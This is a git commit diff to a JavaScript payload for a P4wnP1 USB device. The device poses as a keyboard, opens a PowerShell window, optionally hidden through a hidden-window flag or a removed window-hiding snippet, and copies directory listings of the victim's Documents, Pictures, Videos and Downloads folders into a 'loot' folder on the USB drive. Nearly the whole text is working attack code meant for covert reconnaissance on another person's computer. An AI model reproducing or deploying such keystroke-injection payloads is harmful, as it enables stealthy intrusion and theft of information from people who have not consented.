6c8618e5568c53fcbd48d908947e98b46410faf6
AdamWHY2K <68286215+AdamWHY2K@users.noreply.github.com>
2021-05-26 08:07:46 +0100

    Update Directory_Dacoity.js

--- Directory_Dacoity.js
+++ Directory_Dacoity.js
@@ -1,20 +1,15 @@
-layout("gb-2");			//Keyboard layout
-hide=true; 				//Set to true to hide the console window on the target
-exit=true;				//Set to true to exit the console once finished
+//You need HID Keyboard and USB Mass Storage enabled under USB SETTINGS
 
-function hidePS() {
-	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
-  	press("ENTER");
-}
-//Hide an already opened PowerShell console, but keep input focus
+layout("gb-2");			//Keyboard layout
+hide=false; 			//Set to true to hide the console window on the target
+exit=false;			//Set to true to exit the console once finished
 
 typingSpeed(0,0);		//Typing as fast as possible
 press("GUI r");
 delay(500);
-type("powershell\n");
+if (hide) type("powershell -w h -NoP -NonI\n"); else type("powershell\n"); //Hide the console if chosen to do so
 delay(1000);
-if (hide) { hidePS(); } //Hide the console if chosen to do so
-type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name)\n");			//Replace 'P4WNP1' with your drive name
+type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name)\n");	   //Replace 'P4WNP1' with your drive name
 delay(100);
 type("tree /F /A $env:USERPROFILE\\Documents > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A $env:USERPROFILE\\Pictures > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A $env:USERPROFILE\\Videos > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt\n");
 //env:USERPROFILE returns the default directory where Documents, Pictures, Downloads, etc reside
